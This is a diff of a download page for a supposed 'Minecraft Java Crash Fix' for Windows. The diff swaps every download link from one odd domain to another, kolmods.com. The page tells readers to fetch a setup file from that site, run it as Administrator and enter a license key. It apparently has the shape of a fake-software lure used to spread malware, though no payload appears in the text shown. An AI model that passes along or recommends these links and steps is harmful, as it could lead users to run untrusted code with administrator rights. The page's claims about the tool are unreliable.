@@ -13,27 +13,27 @@ Fix **minecraft java edition crash on startup** on Windows 10/11. This page incl
 > **This is the download page.** Use the button or link below to get **Minecraft Java Crash Fix** for Windows.
 
 <p align="center">
-  <a href="https://minecraftfix.wonderchain.fun/">
+  <a href="https://minecraftfix.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Minecraft%20Java%20Crash%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Minecraft Java Crash Fix">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[minecraftfix.wonderchain.fun](https://minecraftfix.wonderchain.fun/)** |
-| **Full URL** | `https://minecraftfix.wonderchain.fun/` |
+| **Direct link** | **[minecraftfix.kolmods.com](https://minecraftfix.kolmods.com/)** |
+| **Full URL** | `https://minecraftfix.kolmods.com/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — minecraftfix.wonderchain.fun](https://minecraftfix.wonderchain.fun/)** (link above)
+1. Click **[Download — minecraftfix.kolmods.com](https://minecraftfix.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://minecraftfix.wonderchain.fun/"><strong>⬇ Download Minecraft Java Crash Fix now</strong></a></p>
+<p align="center"><a href="https://minecraftfix.kolmods.com/"><strong>⬇ Download Minecraft Java Crash Fix now</strong></a></p>
 
 ---
 
